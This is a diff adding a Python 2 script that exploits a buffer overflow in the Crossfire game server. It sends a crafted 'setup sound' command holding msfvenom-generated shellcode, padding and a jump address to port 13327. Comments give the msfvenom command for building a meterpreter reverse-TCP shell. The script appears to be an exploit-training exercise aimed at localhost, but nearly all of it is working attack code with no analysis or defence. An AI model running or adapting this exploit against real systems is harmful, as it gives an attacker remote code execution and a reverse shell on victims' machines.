@@ -1,0 +1,38 @@
+#!/usr/bin/python
+
+### Exploiting BufferOverflow vulnerability in the crossfire game
+### server running on 127.0.0.1
+### to generate shell code use msfvenom.
+### msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f c -a x86 --platform linux -b "\x00"
+### Total lenght 4368 bytes
+### shell code length 105 bytes
+### bad char "\x00"
+### Jmp address "\x97\x45\x13\x08"
+
+
+import socket
+
+host = "127.0.0.1"
+
+shell =("\xbe\xde\x81\xcb\x99\xdb\xd4\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x14\x31\x75\x14\x83\xc5\x04\x03\x75\x10\x3c\x74\xfa\x42\x37"
+"\x94\xae\x37\xe4\x31\x53\x31\xeb\x76\x35\x8c\x6b\x2d\xe4\x5c"
+"\x03\xd0\x18\x70\x8f\xbe\x08\x23\x7f\xb6\xc8\xa9\x19\x90\xc7"
+"\xae\x6c\x61\xdc\x1d\x6a\xd2\xba\xac\xf2\x51\xf3\x49\x3f\xd5"
+"\x60\xcc\xd5\xe9\xde\x22\xa9\x5f\xa6\x44\xc1\x70\x77\xc6\x79"
+"\xe7\xa8\x4a\x10\x99\x3f\x69\xb2\x36\xc9\x8f\x82\xb2\x04\xcf")
+
+ret = "\x97\x45\x13\x08"
+
+crash = shell +"\x41" * (4368-105) + ret + "\x83\xc0\x0c\xff\xe0\x90\x90"
+
+buffer = "\x11(setup sound " +  crash + "\x90\x00#"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host, 13327))
+data=s.recv(1024)
+print data
+s.send(buffer)
+s.close()
+print "[*]Payload Sent !"
